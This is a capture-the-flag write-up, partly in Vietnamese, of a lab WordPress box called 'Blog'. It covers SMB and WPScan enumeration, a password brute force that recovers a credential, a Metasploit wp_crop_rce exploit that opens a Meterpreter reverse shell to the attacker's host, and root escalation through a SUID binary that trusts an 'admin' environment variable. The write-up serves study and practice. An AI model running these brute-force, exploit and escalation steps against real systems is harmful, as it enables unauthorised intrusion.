![image](https://hackmd.io/_uploads/H1f09sa9C.png)

# Challange info and Comment
## Challange info
Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

## Comment
Challange khá là dễ nhưng thêm 1 kỹ thuật leo quuyền về SUID nữa nên tôi lại phải viết Wup cho đỡ quên : )

# Recon
## nmap 
Scan được 4 port là http, smb và ssh
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Port 445 - SMB
### smbshares
Có sẵn và lưu trữ 3 tệp, nhưng không có tệp nào có vẻ thú vị.
```
unknown@kali:/data/tmp$ smbclient -L //10.10.10.32
Enter WORKGROUP\unknown's password: 

    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    BillySMB        Disk      Billy's local SMB Share
    IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
unknown@kali:/data/tmp$ smbclient //10.10.10.32/BillySMB
Enter WORKGROUP\unknown's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 20:17:05 2020
  ..                                  D        0  Tue May 26 19:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 20:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 20:13:45 2020
  check-this.png                      N     3082  Tue May 26 20:13:43 2020

        15413192 blocks of size 1024. 9788764 blocks available
smb: \> get Alice-White-Rabbit.jpg 
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (68.3 KiloBytes/sec) (average 68.3 KiloBytes/sec)
smb: \> get tswift.mp4 
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (775.7 KiloBytes/sec) (average 609.8 KiloBytes/sec)
smb: \> get check-this.png 
getting file \check-this.png of size 3082 as check-this.png (13.9 KiloBytes/sec) (average 552.4 KiloBytes/sec)
smb: \> exit
```
### Steghide
The jpg file is a rabbit hole:
```
unknown@kali:/data/tmp$ steghide extract -sf Alice-White-Rabbit.jpg 
Enter passphrase: 
wrote extracted data to "rabbit_hole.txt".
unknown@kali:/data/tmp$ cat rabbit_hole.txt 
You've found yourself in a rabbit hole, friend.
```
### QRcode
Mã QRCode là một URL rút gọn chuyển hướng đến https://www.youtube.com/watch?v=eFTLKWw542g
```
unknown@kali:/data/tmp$ zbarimg -q --raw check-this.png 
https://qrgo.page.link/M6dE
```
## Port 80 - htp
### WPscan
Trước tiên hãy thêm dòng này vào tệp /etc/hosts:
```
blog.thm 10.10.10.32
```
Chúng tôi có thể sử dụng WPscan để xác định phiên bản và liệt kê người dùng hợp lệ:
```
unknown@kali:/data/tmp$ wpscan --url http://blog.thm --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.2
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.thm/ [10.10.10.32]
[+] Started: Thu Aug 13 20:24:27 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Aug 13 20:24:34 2020
[+] Requests Done: 51
[+] Cached Requests: 8
[+] Data Sent: 11.419 KB
[+] Data Received: 385.417 KB
[+] Memory used: 150.793 MB
[+] Elapsed time: 00:00:07
```
Chúng ta biết rằng phiên bản WordPress đã lỗi thời (phiên bản **5.0**) và chúng ta đã tìm thấy **2 người dùng**:

- **kwheel**
- **bjoel**

### Attack password
Hãy lưu người dùng vào user.txt và thử dùng brute--force:
```
$ wpscan -U users.txt -P /usr/share/wordlists/rockyou.txt --url http://blog.thm

[REDACTED]

[SUCCESS] - kwheel / cutiepie1  
```
# Root flag
Lý do lấy root flag trước vì user flag lại nằm trong thư mục có đặc quyền mới xem được nội dunng nên ta đi từ root flag trước

## Exploit 
### Metasploit
Sau khi có đầy đủ options cho **msf** ta tiến hành tấn công 
```
$ msfconsole -q
msf5 > use exploit/multi/http/wp_crop_rce
msf5 exploit(multi/http/wp_crop_rce) > show options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf5 exploit(multi/http/wp_crop_rce) > set rhost blog.thm
rhost => blog.thm
msf5 exploit(multi/http/wp_crop_rce) > set username kwheel
username => kwheel
msf5 exploit(multi/http/wp_crop_rce) > set password cutiepie1
password => cutiepie1
msf5 exploit(multi/http/wp_crop_rce) > exploit 

[*] Started reverse TCP handler on 10.9.0.54:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (38288 bytes) to 10.10.10.32
[*] Meterpreter session 1 opened (10.9.0.54:4444 -> 10.10.10.32:45862) at 2020-08-13 20:48:02 +0200
[*] Attempting to clean up files...

meterpreter > 
```
Mở shell và tìm SUID. Ta kiểm tra xem tập tin nào thuộc quyền sở hữu của root và có tập bit setuid sẽ phát hiện ra sự hiện diện của một tệp thực thi không xác định `/usr/sbin/checker`: 

```
meterpreter> shell
www-data@blog:/$ find / -type f -user root -perm -u=s 2>/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
<SNIP>
```
Chạy nó sẽ cho kết quả rằng chúng ta “Không phải là admin”:
```
www-data@blog:/$ /usr/sbin/checker
/usr/sbin/checker
Not an Admin
```
### ltrace
ltrace là công cụ dùng để theo dõi và hiển thị các lệnh gọi thư viện (library calls) mà một chương trình thực thi. Nó giúp bạn hiểu được các tương tác giữa chương trình và các thư viện mà chương trình đó sử dụng

Chạy nó với `ltrace` cho thấy rằng tệp thực thi đang kiểm tra biến môi trường (admin) để xác định xem chúng ta có phải là admin hay không:
```
www-data@blog:/$ ltrace /usr/sbin/checker
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
```
Chúng ta sẽ tạo một biến môi trường admin và đặt nó ở mức 1:
```
www-data@blog:/$ export admin=1
export admin=1
www-data@blog:/$ /usr/sbin/checker
/usr/sbin/checker
root@blog:/#
```
## Post-Exploit
```
root@blog:/root# cat root.txt
cat root.txt
9a0b2b618bef9bfa7ac28c13****
```
# User flag
## Exploit
### find
```
root@blog:/root# find / -type f -name user.txt 2>/dev/null
find / -type f -name user.txt 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
```
## Post-Exploit
```
root@blog:/root# cat /media/usb/user.txt
cat /media/usb/user.txt
c8421899aae571f7af486492b****
```

--------------------Kết thúc Challange!--------------------
